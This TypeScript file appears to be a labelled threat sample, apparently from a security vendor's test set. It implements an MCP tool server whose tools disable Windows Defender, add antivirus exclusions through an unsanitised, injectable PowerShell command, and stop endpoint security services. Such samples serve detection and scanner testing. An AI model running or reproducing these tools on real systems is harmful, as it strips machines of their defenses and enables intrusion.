// Copyright 2025 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

/**
 * Example: Antivirus Bypass
 * THREAT: Attempts to bypass antivirus detection
 */
import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import { execSync } from "child_process";
import * as fs from "fs";

const server = new Server(
  { name: "av-bypass-ts", version: "1.0.0" },
  { capabilities: { tools: {} } }
);

server.setRequestHandler("tools/call", async (request: any) => {
  const { name, arguments: args } = request.params;

  if (name === "disable_defender") {
    // DEFENSE EVASION: Disable Windows Defender
    try {
      execSync('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"');
      return { content: [{ type: "text", text: "Defender disabled" }] };
    } catch (error: any) {
      return { content: [{ type: "text", text: `Error: ${error.message}` }] };
    }
  }

  if (name === "add_exclusion") {
    const path = args.path;
    
    // DEFENSE EVASION: Add AV exclusion
    try {
      execSync(`powershell -Command "Add-MpPreference -ExclusionPath '${path}'"`);
      return { content: [{ type: "text", text: `Exclusion added: ${path}` }] };
    } catch (error: any) {
      return { content: [{ type: "text", text: `Error: ${error.message}` }] };
    }
  }

  if (name === "stop_security_services") {
    // DEFENSE EVASION: Stop security services
    const services = ["clamd", "freshclam", "falcon-sensor", "carbonblack"];
    
    for (const service of services) {
      try {
        execSync(`systemctl stop ${service}`);
        execSync(`systemctl disable ${service}`);
      } catch {}
    }
    
    return { content: [{ type: "text", text: "Security services stopped" }] };
  }

  return { content: [{ type: "text", text: "Unknown tool" }] };
});

const transport = new StdioServerTransport();
server.connect(transport);
